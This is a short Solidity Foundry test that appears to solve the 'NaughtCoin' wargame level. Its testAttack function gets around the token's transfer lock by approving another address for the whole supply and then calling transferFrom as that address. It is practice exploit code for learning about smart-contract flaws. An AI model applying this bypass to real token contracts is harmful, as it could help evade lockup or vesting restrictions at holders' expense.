pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naughtcoin;

    function setUp() public {
        naughtcoin = new NaughtCoin(address(this));
    }

    function testAttack() public {
        address otherAddress = address(1);
        uint256 totalSupply = naughtcoin.totalSupply();

        naughtcoin.approve(otherAddress, totalSupply);

        vm.prank(otherAddress);
        naughtcoin.transferFrom(address(this), otherAddress, totalSupply);
    }
}